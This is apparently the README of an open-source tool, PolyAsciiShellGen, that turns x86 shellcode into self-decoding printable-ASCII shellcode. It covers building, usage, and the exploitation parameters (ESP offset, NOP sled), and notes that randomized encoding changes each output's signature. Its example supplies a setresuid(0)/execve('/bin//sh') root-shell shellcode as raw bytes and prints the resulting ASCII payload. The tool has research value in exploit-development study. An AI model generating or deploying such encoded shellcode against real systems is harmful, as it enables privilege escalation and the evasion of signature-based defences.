# PolyAsciiShellGen: Caezar ASCII Shellcode Generator

Full description and demonstration on this blog post: https://vincentdary.github.io/blog-posts/polyasciishellgen-caezar-ascii-shellcode-generator/index.html

  - [Build](#build)
  - [Usage](#usage)
  - [Options](#options)
  - [Result](#result)
  - [Return Value](#return-value)
  - [Exemple](#exemple)


## PolyAsciiShellGen
PolyAsciiShellGen is an experimental ASCII shellcode generator based on
the part II of the *Riley "Caezar" Eller*'s paper. The program take a classic
shellcode in entry and automates the shellcode encoding process into ASCII
caracteres and assemble an ASCII shellcode able to decode, load and
execute the original shellcode.


### Build
Clone PolyAsciiShellGen from
[my Github repository [3]](https://github.com/VincentDary/PolyAsciiShellGen)
and build it.

```text
$ git clone https://github.com/VincentDary/PolyAsciiShellGen.git
$ cd PolyAsciiShellGen
$ make && make clean
```

### Usage
```text
$ ./PolyAsciiShellGen
usage: PolyAsciiShellGen <esp offset> <nop sleed factor N * 4 NOPS> <shellcode "\xOP\xOP"...>
```

### Options
**`<esp offset>`**

The *`esp offset`* parameter is a 32 bit integer, positive or negative.
When the generated ASCII shellcode is executed it starts to add the
*`esp offset`* to ESP in order to set the register position after its code
with enough space to build the decoded shellcode as a bridge to the code of the
ASCII shellcode. This value is generaly deduct during a pre-exploitation
debugging session. If a NOP sleed is add before the decoded shellcode via the
*`NOP sleed factor`*, the *`esp offset`* value can have a margin of error
according the size of the NOP sleed use. Here the method to compute the
*`esp offset`*.

```text
 esp_offset = @shellcode_ascii_start_address - @esp_address
              + ascii_shellcode_size
              + original_shellcode_size
```

Note: the `ascii_shellcode_size` must be padded on a 32-bit boundary.

**`<nop sleed factor>`**

The *`nop sleed factor`* parameter is a 32 bit unsigned integer use as a NOP
sleed multiplier to add an extra NOP sleed before the first instructions of the
decoded shellcode in order to reliable the decoded shellcode execution. This
factor is multiplied to four NOP instructions. So if N=4, 4*4=16 NOP
instructions are added before the shellcode.

**`<shellcode>`**

The `shellcode` parameters is the shellcode to encode in escaping format
`...\xcd\x80...` .If the lenght of the shellcode is not a multiplier of four bytes, it
is padded with extra NOP bytes in order to pass an exploit code aligned on a 32-bit
boundary to the underlying ASCII shellcode generator.


### Result
PolyAsciiShellGen print the resulting ASCII shellcode on the standard output. The
ASCII charset use for the ASCII shellcode building is the following.

```text
 %_01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-
```

To encode the original shellcode, the underlying encoder uses values generated
randomly at each execution. So, the printable shellcodes generated have a
different signatures from the original shellcode at each new generation.


### Return Value
The command returns 0 if the ASCII shellcode generation is successful or 1 if
it fails.


### Exemple
Here an example with a `setresuid(0,0,0); execve(/bin//sh,0,0)` shellcode.

```text
$ ./PolyAsciiShellGen -270  10  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xcd\x80\x31\xc0\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80"
TX-KKKK-KKKK-xjiiP\%0000%AAAA-9%%%-GJJJP-hhNh-th3%-Q6-5P-yyyZ-yZy6-L6---2-8-P-7KKd-%Kdz-%RkzP-xxxx-GGGx-0AFiP-OOOO-jOwO-iaraP-NN%N-a%%a-q44tP-%SS0-%SL5-7uC%P-FkFF-9pUhP-XXXX-XXXX-PXOFP-AAAj-0w2j-0w-vPPPPPPPPPP
```
